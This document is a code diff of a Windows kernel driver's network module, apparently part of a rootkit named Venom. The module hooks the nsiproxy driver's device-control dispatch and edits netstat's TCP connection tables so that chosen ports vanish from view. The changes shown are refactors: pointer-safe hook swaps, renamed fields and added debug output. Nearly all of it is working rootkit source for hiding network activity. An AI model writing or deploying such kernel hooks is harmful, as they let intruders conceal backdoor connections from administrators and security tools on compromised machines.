@@ -1,4 +1,3 @@
-#pragma warning( disable : 26451 4311 4302 )
 #include "NetworkHandler.h"
 #include "Venom.h"
 
@@ -14,7 +13,7 @@ NTSTATUS NetworkHandler::hookNsi()
 
 	RtlInitUnicodeString(&nsiDriverName, L"\\Driver\\nsiproxy");
 
-	status = ObReferenceObjectByName(&nsiDriverName, OBJ_CASE_INSENSITIVE, NULL, 0, *IoDriverObjectType, KernelMode, NULL, reinterpret_cast<PVOID*>(&originalNsiDeviceIo));
+	status = ObReferenceObjectByName(&nsiDriverName, OBJ_CASE_INSENSITIVE, NULL, 0, *IoDriverObjectType, KernelMode, NULL, reinterpret_cast<PVOID*>(&pNsiDriverObject));
 
 	if (!NT_SUCCESS(status))
 	{
@@ -33,7 +32,9 @@ NTSTATUS NetworkHandler::hookNsi()
 	originalNsiDeviceIo = pNsiDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL];
 
 	//Perform IRP hook
-	InterlockedExchange(reinterpret_cast<PLONG>(&(pNsiDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL])), reinterpret_cast<LONG>(hookedDeviceIoControl));
+	InterlockedExchangePointer((PVOID*)&pNsiDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL], hookedDeviceIoControl);
+
+	DbgPrint("Successfully hooked NSI driver\n");
 
 	return status;
 }
@@ -87,6 +88,7 @@ ERROR:
 	return status;
 }
 
+
 NTSTATUS NetworkHandler::hookedCompletionRoutine(
 	PDEVICE_OBJECT  DeviceObject,
 	PIRP  Irp,
@@ -101,33 +103,32 @@ NTSTATUS NetworkHandler::hookedCompletionRoutine(
 
 	if (NT_SUCCESS(Irp->IoStatus.Status))
 	{
-
 		nsiParam = static_cast<PNSI_PARAM>(Irp->UserBuffer);
-		if (MmIsAddressValid(nsiParam->lpMem))
+
+		if (MmIsAddressValid((PVOID)nsiParam->lpMem))
 		{
 
 			// netstat will involve internal calls which will use nsi_param structure.
-			if ((nsiParam->UnknownParam8 == 0x38))
+			if ((nsiParam->Protocol == TCP))
 			{
 				KAPC_STATE apcState;
-				PNSI_STATUS_ENTRY pStatusEntry = static_cast<PNSI_STATUS_ENTRY>(nsiParam->lpStatus);
-				PINTERNAL_TCP_TABLE_ENTRY pTcpEntry = static_cast<PINTERNAL_TCP_TABLE_ENTRY>(nsiParam->lpMem);
-				int itemCount = nsiParam->TcpConnectionCount;
+				PNSI_STATUS_ENTRY pStatusEntry = static_cast<PNSI_STATUS_ENTRY>((PNSI_STATUS_ENTRY)nsiParam->lpStatus);
+				PINTERNAL_TCP_TABLE_ENTRY pTcpEntry = static_cast<PINTERNAL_TCP_TABLE_ENTRY>((PVOID)nsiParam->lpMem);
+				ULONG_PTR ConnectionsCount = nsiParam->ConnectionCount;
 
 				KeStackAttachProcess(pContext->pcb, &apcState);
 
 				//Make sure we are in the context of original process.
-				for (ConnectionIndex = 0; ConnectionIndex < itemCount; ConnectionIndex++)
+				for (ConnectionIndex = 0; ConnectionIndex < ConnectionsCount; ConnectionIndex++)
 				{
 
 					if (shouldHidePort(pTcpEntry[ConnectionIndex].localEntry.Port))
 					{
-						//NSI will map status array entry to tcp table array entry
-						//we must modify both synchronously
-						RtlCopyMemory(&pTcpEntry[ConnectionIndex], &pTcpEntry[ConnectionIndex + 1], sizeof(INTERNAL_TCP_TABLE_ENTRY) * (itemCount - ConnectionIndex));
-						RtlCopyMemory(&pStatusEntry[ConnectionIndex], &pStatusEntry[ConnectionIndex + 1], sizeof(NSI_STATUS_ENTRY) * (itemCount - ConnectionIndex));
-						itemCount--;
-						nsiParam->TcpConnectionCount--;
+						//NSI will map status array entry to tcp table array entry, we must modify both synchronously.
+						RtlCopyMemory(&pTcpEntry[ConnectionIndex], &pTcpEntry[ConnectionIndex + 1], sizeof(INTERNAL_TCP_TABLE_ENTRY) * (ConnectionsCount - ConnectionIndex));
+						RtlCopyMemory(&pStatusEntry[ConnectionIndex], &pStatusEntry[ConnectionIndex + 1], sizeof(NSI_STATUS_ENTRY) * (ConnectionsCount - ConnectionIndex));
+						ConnectionsCount--;
+						nsiParam->ConnectionCount--;
 						ConnectionIndex--;
 					}
 				}
@@ -139,7 +140,6 @@ NTSTATUS NetworkHandler::hookedCompletionRoutine(
 
 	nextIrpLocation->Context = pContext->oldCtx;
 	nextIrpLocation->CompletionRoutine = pContext->oldIocomplete;
-
 
 	if (pContext->bShouldInvolve)
 	{
@@ -161,14 +161,13 @@ NTSTATUS NetworkHandler::hookedCompletionRoutine(
 NTSTATUS NetworkHandler::unhookNsi() {
 
 	//Undo hook
-	InterlockedExchange(reinterpret_cast<PLONG>(&(pNsiDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL])), reinterpret_cast<LONG>(originalNsiDeviceIo));
+	InterlockedExchangePointer((PVOID*)&pNsiDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL], originalNsiDeviceIo);
 	KdPrint(("NetworkHandler: original DeviceControl function restored.\n"));
 
 	//Decrease reference count of hooked driver
 	ObDereferenceObject(pNsiDriverObject);
 
-	//Sleep after removing IRP hooks
-	//to make sure all handlers are done
+	//Sleep after removing IRP hooks to make sure all handlers are done
 	LARGE_INTEGER wait_time;
 	wait_time.QuadPart = -50 * 1000 * 1000;
 	KeDelayExecutionThread(KernelMode, 0, &wait_time);
@@ -184,10 +183,11 @@ void NetworkHandler::cleanHiddenPorts() {
 	// Free list
 	while (!IsListEmpty(&HiddenPortsContext.HiddenPortsHead)) {
 		auto entry = RemoveHeadList(&HiddenPortsContext.HiddenPortsHead);
-		auto item = CONTAINING_RECORD(entry, HiddenPort, Entry);
-		ExFreePool(item);
+		auto hiddenPortContext = CONTAINING_RECORD(entry, HiddenPort, Entry);
+		ExFreePool(hiddenPortContext);
 	}
 }
+
 
 void NetworkHandler::addHiddenPort(LIST_ENTRY* entry) {
 	
@@ -196,12 +196,13 @@ void NetworkHandler::addHiddenPort(LIST_ENTRY* entry) {
 		// Too many items, remove oldest one
 		auto head = RemoveHeadList(&HiddenPortsContext.HiddenPortsHead);
 		HiddenPortsContext.HiddenPortsCount--;
-		auto item = CONTAINING_RECORD(head, HiddenPort, Entry);
-		ExFreePool(item);
+		auto hiddenPortContext = CONTAINING_RECORD(head, HiddenPort, Entry);
+		ExFreePool(hiddenPortContext);
 	}
 	InsertTailList(&HiddenPortsContext.HiddenPortsHead, entry);
 	HiddenPortsContext.HiddenPortsCount++;
 }
+
 
 bool NetworkHandler::shouldHidePort(USHORT port) {
 
@@ -214,9 +215,9 @@ bool NetworkHandler::shouldHidePort(USHORT port) {
 
 		while (&HiddenPortsContext.HiddenPortsHead != temp) {
 
-			auto item = CONTAINING_RECORD(temp, HiddenPort, Entry);
+			auto hiddenPortContext = CONTAINING_RECORD(temp, HiddenPort, Entry);
 			
-			if (port == item->HiddenPort) {
+			if (port == hiddenPortContext->HiddenPort) {
 				return true;
 			}
 			temp = temp->Flink;
@@ -225,6 +226,7 @@ bool NetworkHandler::shouldHidePort(USHORT port) {
 
 	return false;
 }
+
 
 USHORT NetworkHandler::htons(USHORT a)
 {
